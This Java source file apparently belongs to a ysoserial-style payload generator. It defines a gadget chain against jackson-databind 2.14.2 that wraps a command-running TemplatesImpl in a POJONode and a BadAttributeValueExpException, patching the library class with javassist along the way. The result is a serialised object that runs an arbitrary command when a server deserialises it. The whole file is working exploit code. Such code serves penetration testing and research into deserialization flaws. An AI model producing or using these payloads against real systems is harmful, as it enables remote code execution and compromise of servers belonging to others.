package payloads;
import com.fasterxml.jackson.databind.node.POJONode;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import payloads.annotation.Authors;
import payloads.annotation.Dependencies;
import util.Gadgets;
import util.PayloadRunner;
import util.Reflections;

import javax.management.BadAttributeValueExpException;
import java.util.HashMap;

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"com.fasterxml.jackson.core:jackson-databind:2.14.2"})
@Authors({Authors.Y4ER})
public class Jackson implements ObjectPayload<Object> {
    private  static boolean init =false;
    public Object getObject(final String command) throws Exception {
        final Object template = Gadgets.createTemplatesImpl(command);

        if (init == false)
        {
            init = true;
            CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
            CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
            ctClass.removeMethod(writeReplace);
            ctClass.toClass();
        }

        // 将修改后的CtClass加载至当前线程的上下文类加载器中


        POJONode node = new POJONode(template);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Reflections.setFieldValue(badAttributeValueExpException, "val", node);

        HashMap hashMap = new HashMap();
        hashMap.put(template, badAttributeValueExpException);

        return hashMap;
    }


    public static byte[] getBytes(final String command, Boolean fusion) throws Exception {
        return PayloadRunner.run(Jackson.class, command, fusion);
    }
}
